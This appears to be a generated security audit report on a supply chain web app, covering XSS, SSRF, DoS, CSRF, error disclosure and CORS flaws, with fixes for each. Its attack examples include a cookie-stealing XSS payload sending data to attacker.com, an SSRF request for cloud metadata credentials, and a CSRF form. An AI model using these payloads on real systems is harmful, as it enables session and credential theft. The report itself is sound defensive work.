# CVEFinder Security Analysis Report
**Generated:** 2026-02-05T15:27:07.581Z  
**Project:** OctoCAT Supply Chain Management  
**Severity Levels:** üî¥ CRITICAL | üü† HIGH | üü° MEDIUM | üü¢ LOW

---

## Executive Summary

This report documents security vulnerabilities discovered during a comprehensive code review of the OctoCAT Supply Chain application. **5 CRITICAL/HIGH vulnerabilities** and **2 MEDIUM vulnerabilities** have been identified across frontend and backend components.

### Vulnerability Breakdown
- **Critical (1):** XSS via dangerouslySetInnerHTML
- **High (4):** Dependency vulnerabilities (qs DoS, axios SSRF/DoS, React Router XSS/CSRF)
- **Medium (2):** Error handling, Environment configuration

---

## CRITICAL VULNERABILITIES

### CVE-001: Cross-Site Scripting (XSS) via dangerouslySetInnerHTML
**Severity:** üî¥ CRITICAL  
**CVSS Score:** 9.8 (Network: Adjacent, Complexity: Low, Privileges: None, User: None)  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  

#### Location
- **File:** `frontend/src/components/Login.tsx`
- **Lines:** 45-50
- **Component:** Login error message display

#### Description
The Login component uses `dangerouslySetInnerHTML` to render user-controlled error messages from URL query parameters without sanitization. An attacker can craft a malicious URL with XSS payload in the `error` query parameter, which will be executed in the victim's browser with the application's privileges.

#### Attack Vector
```
GET /login?error=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
This allows attackers to:
- Steal user session cookies
- Capture credentials
- Modify page content
- Perform phishing attacks
- Redirect users to malicious sites

#### Vulnerable Code
```tsx
// Line 16-18: Unsanitized query parameter
const errorMsg = searchParams.get('error');
if (errorMsg) {
  setError(errorMsg);
}

// Line 45-50: Raw HTML injection
{error && (
  <div
    className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4"
    dangerouslySetInnerHTML={{ __html: error }}
  />
)}
```

#### Remediation Steps
1. **Remove `dangerouslySetInnerHTML`** - Use React's standard text rendering
2. **Implement HTML sanitization** - Use DOMPurify or similar library if HTML is necessary
3. **Validate query parameters** - Implement strict validation on error parameter
4. **Content Security Policy** - Add CSP headers to mitigate XSS impact

#### Recommended Fix
```tsx
// Option 1: Plain text rendering (PREFERRED)
{error && (
  <div className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4">
    {error}
  </div>
)}

// Option 2: With sanitization (if HTML formatting needed)
import DOMPurify from 'dompurify';
{error && (
  <div
    className="bg-red-500/10 border border-red-500 text-red-500 rounded-md p-3 mb-4"
    dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(error) }}
  />
)}

// Option 3: Validate and constrain error parameter
const errorMsg = searchParams.get('error');
const sanitizedError = errorMsg && typeof errorMsg === 'string' 
  ? errorMsg.slice(0, 100).replace(/[<>]/g, '')
  : '';
```

#### Testing & Validation
- Test with XSS payloads: `<script>alert('xss')</script>`, `<img src=x onerror=alert('xss')>`
- Verify error messages display as plain text
- Run OWASP ZAP or similar security scanner
- Add unit test for malicious input handling

#### References
- https://owasp.org/www-community/attacks/xss/#stored-xss-attacks
- https://react.dev/reference/react-dom/dangerouslySetInnerHTML
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

## HIGH SEVERITY VULNERABILITIES

### CVE-002: qs Module DoS Vulnerability (Array Limit Bypass)
**Severity:** üü† HIGH  
**CVSS Score:** 7.5 (Network: Adjacent, Complexity: Low, Privileges: None)  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
**GitHub Advisory:** GHSA-6rw7-vpxm-498p  

#### Location
- **Package:** `qs` (transitive dependency via express ‚Üí body-parser)
- **Affected Version:** < 6.14.1
- **API Package:** `api/package.json`

#### Description
The `qs` library used by Express for query string parsing has a DoS vulnerability via array limit bypass. Attackers can exhaust server memory by sending requests with deeply nested bracket notation in query parameters.

#### Attack Impact
- **Availability:** Server memory exhaustion leading to service crash
- **Performance:** Degradation affecting all API consumers
- **Scope:** Affects all API endpoints that process query parameters

#### Attack Example
```
GET /api/orders?a[b][c][d][e][f][g][h][i][j][k][l][m][n][o][p][q][r][s][t][u][v][w][x][y][z]...
```

#### Affected Dependencies Chain
```
express ^4.21.2
  ‚îî‚îÄ‚îÄ body-parser <=1.20.3 || 2.0.0-beta.1 - 2.0.2
      ‚îî‚îÄ‚îÄ qs <6.14.1
```

#### Remediation Steps
1. **Update qs to >= 6.14.1** - Run `npm audit fix`
2. **Update Express and body-parser** - Ensure latest secure versions
3. **Implement request size limits** - Add limits to query parameters via body-parser options
4. **Monitor memory usage** - Set up alerts for unexpected memory spikes

#### Recommended Fix
```json
// Update in api/package.json to enforce minimum versions
{
  "dependencies": {
    "express": "^4.21.2",
    "body-parser": "^1.20.4"
  }
}

// Run: npm audit fix
// Or manually: npm install qs@^6.14.1
```

#### Additional Hardening
```typescript
// api/src/index.ts - Add request limits
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ 
  limit: '100kb', 
  parameterLimit: 50,
  extended: true 
}));
```

#### Testing & Validation
- Test with malicious query strings before and after patch
- Monitor memory during load testing
- Verify qs version: `npm list qs`

#### References
- https://github.com/advisories/GHSA-6rw7-vpxm-498p
- https://expressjs.com/en/api/express.json.html

---

### CVE-003: axios Multiple Vulnerabilities (SSRF + DoS)
**Severity:** üü† HIGH  
**CVSS Scores:** 7.1 (SSRF), 7.5 (DoS)  
**CWE:** CWE-918 (Server-Side Request Forgery), CWE-400 (Uncontrolled Resource Consumption)  
**GitHub Advisories:** GHSA-jr5f-v2jv-69x6, GHSA-4hjh-wcwx-xvwj  

#### Location
- **Package:** `axios`
- **Affected Versions:** 1.0.0 - 1.11.0 (current: 1.8.1)
- **Frontend Package:** `frontend/package.json`

#### Description
Axios has two critical vulnerabilities:
1. **SSRF Vulnerability:** Axios requests are vulnerable to SSRF attacks when handling absolute URLs with credentials
2. **DoS Vulnerability:** Lack of data size checking allows memory exhaustion via large response bodies

#### Attack Vectors

**SSRF Attack:**
```javascript
// Attacker controlled URL
const url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
axios.get(url); // Exposes AWS credentials
```

**DoS Attack:**
```javascript
// Server responds with GB of data
axios.get('http://attacker.com/huge-file'); // Memory exhaustion
```

#### Affected Dependencies Chain
```
react-query ^3.39.3 (uses axios internally)
  ‚îî‚îÄ‚îÄ axios 1.8.1
```

#### Remediation Steps
1. **Update axios to >= 1.13.4** - Includes both security patches
2. **Add request timeout and size limits** - Prevent resource exhaustion
3. **Validate URLs before requests** - Implement URL validation function
4. **Add circuit breaker pattern** - Prevent cascading failures

#### Recommended Fix
```bash
# Update axios
npm install axios@^1.13.4 --save

# Or force the update (may require resolving other dependencies)
npm audit fix --force
```

#### Additional Hardening
```typescript
// frontend/src/services/apiClient.ts
import axios from 'axios';

const axiosInstance = axios.create({
  timeout: 10000, // 10 second timeout
  maxContentLength: 1 * 1024 * 1024, // 1MB max response
  maxBodyLength: 1 * 1024 * 1024, // 1MB max request
});

// Validate URLs before making requests
function isValidApiUrl(url: string): boolean {
  try {
    const urlObj = new URL(url);
    // Only allow http/https to same domain
    return ['http:', 'https:'].includes(urlObj.protocol) &&
           urlObj.hostname === process.env.REACT_APP_API_HOST;
  } catch {
    return false;
  }
}
```

#### Testing & Validation
- Test with various URL formats (including SSRF attempts)
- Test with large response bodies
- Verify timeout enforcement
- Check version: `npm list axios`

#### References
- https://github.com/advisories/GHSA-jr5f-v2jv-69x6
- https://github.com/advisories/GHSA-4hjh-wcwx-xvwj

---

### CVE-004: React Router Multiple XSS/CSRF Vulnerabilities
**Severity:** üü† HIGH  
**CVSS Scores:** 6.1-8.2 (XSS), 8.1 (CSRF)  
**CWE:** CWE-79 (XSS), CWE-352 (CSRF)  
**GitHub Advisories:** GHSA-2w69-qvjg-hvjx, GHSA-8v8x-cx79-35w7, GHSA-h5cw-625j-3rxh  

#### Location
- **Package:** `react-router-dom`
- **Affected Versions:** 7.0.0-pre.0 - 7.11.0
- **Frontend Package:** `frontend/package.json`

#### Description
React Router v7 has three security vulnerabilities:
1. **Open Redirect XSS:** Improper validation of redirect destinations
2. **SSR XSS in ScrollRestoration:** XSS injection via scroll restoration state
3. **CSRF in Action/Server Action:** Missing CSRF tokens in form submissions

#### Attack Vectors

**Open Redirect:**
```
<Link to="//attacker.com">Click me</Link>
```

**Scroll Restoration XSS:**
```
// Attacker controls scroll restoration data
scrollRestoration: "<img src=x onerror=alert('xss')>"
```

**CSRF:**
```
<!-- Attacker form submits to victim's API -->
<form action="https://victim.com/api/orders" method="POST">
  <input type="hidden" name="action" value="delete">
</form>
```

#### Remediation Steps
1. **Update react-router-dom to >= 7.12.0** - Includes security patches
2. **Implement CSRF token validation** - Add middleware for form submissions
3. **Validate redirect URLs** - Whitelist allowed destinations
4. **Use proper security headers** - SameSite, X-Frame-Options, etc.

#### Recommended Fix
```bash
# Update React Router
npm install react-router-dom@^7.12.0 --save

# Or via audit fix
npm audit fix
```

#### Additional Hardening
```typescript
// frontend/src/middleware/csrf.ts
export function getCsrfToken(): string {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta?.getAttribute('content') || '';
}

// frontend/src/middleware/redirectValidator.ts
export function isValidRedirect(url: string): boolean {
  try {
    // Only allow relative URLs or same-origin
    if (url.startsWith('/')) return true;
    const urlObj = new URL(url, window.location.origin);
    return urlObj.origin === window.location.origin;
  } catch {
    return false;
  }
}

// frontend/src/index.html - Add CSRF token
<head>
  <meta name="csrf-token" content="{{CSRF_TOKEN}}">
</head>

// API middleware - Validate CSRF
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.headers['x-csrf-token'] || req.body.csrf_token;
    if (!token || token !== req.session.csrfToken) {
      return res.status(403).json({ error: 'CSRF token invalid' });
    }
  }
  next();
});
```

#### Testing & Validation
- Test with malicious redirect URLs
- Verify CSRF token validation on state-changing operations
- Test with browser CSRF attack simulations
- Check version: `npm list react-router-dom`

#### References
- https://github.com/advisories/GHSA-2w69-qvjg-hvjx
- https://github.com/advisories/GHSA-8v8x-cx79-35w7
- https://github.com/advisories/GHSA-h5cw-625j-3rxh

---

## MEDIUM SEVERITY VULNERABILITIES

### CVE-005: Insufficient Error Information Disclosure
**Severity:** üü° MEDIUM  
**CVSS Score:** 5.3 (Network: Adjacent, Complexity: Low, Privileges: None, User: None)  
**CWE:** CWE-209 (Information Exposure Through an Error Message)  

#### Location
- **File:** `api/src/utils/errors.ts`
- **Lines:** 42-71 (errorHandler function)
- **File:** `api/src/routes/order.ts`
- **Lines:** 145-147

#### Description
Error handling middleware may expose sensitive internal error information to clients. The current implementation doesn't distinguish between development and production environments, potentially leaking database schema, system paths, or internal logic details.

#### Current Vulnerable Code
```typescript
// api/src/utils/errors.ts - Line 76-94
export function errorHandler(error: unknown, _req: Request, res: Response, _next: NextFunction): void {
  if (error instanceof DatabaseError) {
    res.status(error.statusCode).json({
      error: {
        code: error.code,
        message: error.message, // May contain sensitive info
      },
    });
    return;
  }

  // Default error handling
  res.status(500).json({
    error: {
      code: 'INTERNAL_ERROR',
      message: 'An unexpected error occurred',
    },
  });
}
```

#### Issue Examples
1. **Database constraint violations** leak table/column structure
2. **File system errors** reveal system paths
3. **Connection errors** expose database hostnames
4. **Stack traces** expose application internals (if NODE_ENV !== production)

#### Attack Impact
- **Information Disclosure:** Attackers can map database schema
- **Reconnaissance:** Easier to plan targeted attacks
- **Compliance:** Violates OWASP Top 10 guidelines

#### Remediation Steps
1. **Environment-aware error responses** - Different messages for dev/prod
2. **Error logging** - Log full errors server-side only
3. **Sanitize error messages** - Remove sensitive information
4. **Implement error IDs** - Return unique error IDs for support reference

#### Recommended Fix
```typescript
// api/src/utils/errors.ts
export function errorHandler(error: unknown, req: Request, res: Response, _next: NextFunction): void {
  const isDevelopment = process.env.NODE_ENV === 'development';
  const errorId = `ERR-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

  // Log full error server-side
  console.error(`[${errorId}]`, error);

  if (error instanceof DatabaseError) {
    const message = isDevelopment 
      ? error.message 
      : 'A database error occurred. Please try again later.';
    
    res.status(error.statusCode).json({
      error: {
        id: errorId,
        code: error.code,
        message,
      },
    });
    return;
  }

  // Generic error for unknown exceptions
  res.status(500).json({
    error: {
      id: errorId,
      code: 'INTERNAL_ERROR',
      message: isDevelopment 
        ? (error instanceof Error ? error.message : String(error))
        : 'An unexpected error occurred. Please contact support with error ID.',
    },
  });
}
```

#### Testing & Validation
- Verify production builds show generic error messages
- Verify development builds show detailed errors
- Check error logs contain full error details
- Test with database connection failures
- Test with validation errors

#### References
- https://owasp.org/www-project-top-ten/
- https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

---

### CVE-006: Insecure CORS Configuration with Hardcoded Origins
**Severity:** üü° MEDIUM  
**CVSS Score:** 5.4 (Network: Adjacent, Complexity: Low, Privileges: None)  
**CWE:** CWE-183 (Permissive List of Allowed Inputs)  

#### Location
- **File:** `api/src/index.ts`
- **Lines:** 19-43

#### Description
The CORS configuration includes hardcoded development origins and overly permissive wildcard patterns for container/cloud environments. This can be problematic:

1. **Hardcoded localhost origins** should not be in production builds
2. **Wildcard regex patterns** `.*\.app\.github\.dev` and `.*\.azurecontainerapps\.io` allow ANY subdomain
3. **No validation** of the `API_CORS_ORIGINS` environment variable
4. **Missing X-Frame-Options** and other security headers

#### Vulnerable Code
```typescript
// api/src/index.ts - Lines 19-31
const corsOrigins = process.env.API_CORS_ORIGINS
  ? process.env.API_CORS_ORIGINS.split(',')
  : [
      'http://localhost:5137',
      'http://localhost:3001',
      'http://127.0.0.1:5137',
      'http://127.0.0.1:3001',
      // Allow all Codespace domains
      /^https:\/\/.*\.app\.github\.dev$/,
      // Allow all Azure Container Apps domains
      /^https:\/\/.*\.azurecontainerapps\.io$/,
    ];
```

#### Attack Scenarios
1. **Subdomain takeover + CORS:** Attacker takes over `attacker.app.github.dev` and accesses API
2. **Cloud resource enumeration:** Attacker can probe `*.azurecontainerapps.io` for valid instances
3. **Development origin in production:** Localhost origins in deployed code allow local attacks

#### Remediation Steps
1. **Use environment variable exclusively** - No hardcoded defaults
2. **Whitelist specific subdomains** - Not wildcard patterns
3. **Add security headers** - X-Frame-Options, Strict-Transport-Security
4. **Validate origins** - Strict validation function
5. **Use environment-aware defaults** - Different for dev/prod

#### Recommended Fix
```typescript
// api/src/index.ts
interface CorsOriginConfig {
  isDevelopment: boolean;
  customOrigins?: string[];
}

function getCorsOrigins(config: CorsOriginConfig): string[] | RegExp[] {
  if (config.customOrigins && config.customOrigins.length > 0) {
    return config.customOrigins.map(origin => origin.trim()).filter(Boolean);
  }

  // Development-only defaults
  if (config.isDevelopment) {
    return [
      'http://localhost:3000',
      'http://localhost:5173', // Vite default
      'http://127.0.0.1:3000',
      'http://127.0.0.1:5173',
    ];
  }

  // Production: CORS must be explicitly configured
  console.warn('‚ö†Ô∏è WARNING: CORS_ORIGINS not configured for production. API requests from browsers will fail.');
  return [];
}

const isDevelopment = process.env.NODE_ENV === 'development';
const corsOrigins = getCorsOrigins({
  isDevelopment,
  customOrigins: process.env.CORS_ORIGINS?.split(','),
});

// CORS configuration
app.use(
  cors({
    origin: corsOrigins,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true,
    maxAge: 3600, // Preflight cache
  }),
);

// Additional security headers
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  if (isDevelopment === false) {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  }
  next();
});
```

#### Environment Configuration
```bash
# .env.production
# Required: explicitly list all allowed origins
CORS_ORIGINS=https://app.example.com,https://admin.example.com

# .env.development
CORS_ORIGINS=http://localhost:3000,http://127.0.0.1:3000
```

#### Testing & Validation
- Verify hardcoded origins are removed in production
- Test CORS with valid and invalid origins
- Verify security headers are present
- Test with different NODE_ENV values
- Check environment variable precedence

#### References
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html
- https://owasp.org/www-community/attacks/xslt

---

## SUMMARY TABLE

| ID | CVE Type | Severity | Component | Status | Assignee |
|---|---|---|---|---|---|
| CVE-001 | XSS (dangerouslySetInnerHTML) | üî¥ CRITICAL | Frontend/Login.tsx | ‚ùå Open | @copilot |
| CVE-002 | DoS (qs arrayLimit) | üü† HIGH | API/package.json | ‚ùå Open | @copilot |
| CVE-003 | SSRF/DoS (axios) | üü† HIGH | Frontend/package.json | ‚ùå Open | @copilot |
| CVE-004 | XSS/CSRF (React Router) | üü† HIGH | Frontend/package.json | ‚ùå Open | @copilot |
| CVE-005 | Error Info Disclosure | üü° MEDIUM | API/errors.ts | ‚ùå Open | @copilot |
| CVE-006 | CORS Misconfiguration | üü° MEDIUM | API/index.ts | ‚ùå Open | @copilot |

---

## Remediation Priority & Timeline

### Phase 1: IMMEDIATE (Hotfix within 24 hours)
- ‚úÖ **CVE-001** - XSS vulnerability (client-side impact is immediate)
- ‚úÖ **CVE-002** - qs DoS (simple npm audit fix)
- ‚úÖ **CVE-003** - axios vulnerabilities (dependency update)

### Phase 2: URGENT (Within 1 week)
- ‚úÖ **CVE-004** - React Router update + CSRF implementation
- ‚úÖ **CVE-005** - Error handling sanitization
- ‚úÖ **CVE-006** - CORS configuration hardening

### Phase 3: ENHANCEMENT (Within 2 weeks)
- Security headers audit
- Dependency audit process automation
- Security testing pipeline
- OWASP ZAP scanning in CI/CD

---

## Testing & Validation Checklist

- [ ] All dependencies updated (npm audit fix)
- [ ] XSS payloads tested in error messages
- [ ] SSRF prevention validated
- [ ] CSRF tokens implemented on state-changing operations
- [ ] Error messages sanitized (development vs production)
- [ ] CORS origins validated
- [ ] Security headers verified
- [ ] Load testing with DoS attack patterns
- [ ] OWASP ZAP scan passed
- [ ] Snyk/npm audit shows zero high/critical vulnerabilities
- [ ] Code review completed by security engineer
- [ ] Automated security tests added to CI/CD

---

## Additional Security Recommendations

1. **Implement Content Security Policy (CSP)**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
   ```

2. **Add Dependency Scanning to CI/CD**
   - npm audit in build pipeline
   - Snyk integration
   - Dependabot alerts

3. **Implement Security Logging**
   - Log failed authentication attempts
   - Log CORS violations
   - Log invalid inputs

4. **Regular Security Audits**
   - Quarterly dependency updates
   - Annual penetration testing
   - Code security reviews for sensitive endpoints

5. **Security Headers Implementation**
   - Strict-Transport-Security
   - X-Content-Type-Options
   - X-Frame-Options
   - Referrer-Policy

---

## References & Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE/CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- Node.js Security Best Practices: https://nodejs.org/en/docs/guides/security/
- React Security: https://react.dev/learn/security
- npm audit guide: https://docs.npmjs.com/cli/v8/commands/npm-audit

---

**Report Generated By:** CVEFinder Security Scanner  
**Last Updated:** 2026-02-05T15:27:07.581Z  
**Next Review:** 2026-03-05T15:27:07.581Z
